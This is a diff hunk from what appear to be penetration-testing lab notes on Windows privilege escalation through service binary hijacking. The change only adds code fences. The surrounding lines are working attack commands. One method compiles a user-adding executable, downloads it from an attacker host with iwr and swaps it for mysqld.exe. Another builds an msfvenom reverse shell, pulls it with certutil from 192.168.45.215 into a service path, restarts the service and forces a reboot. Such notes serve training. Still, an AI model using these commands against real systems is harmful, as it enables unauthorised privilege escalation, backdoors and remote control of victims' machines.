@@ -159,13 +159,15 @@ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
 iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe
 move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
 move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
-
+```
+```
 Second Way -- Generating reverse shell file:
 msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.45.215 lport=1234 -f exe > backdoor.exe
 move "C:\Program Files\MilleGPG5\GPGService.exe" C:\Users\Public\test.exe
 certutil.exe -urlcache -split -f http://192.168.45.215:8080/backdoor.exe "C:\Program Files\MilleGPG5\GPGService.exe"
 Restart-Service ServiceName
-
+```
+```
 Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
 whoami /priv(if SeShutdownPrivilege isn't present,  we would have to wait for the victim to manually start the service)
 shutdown /r /t 0
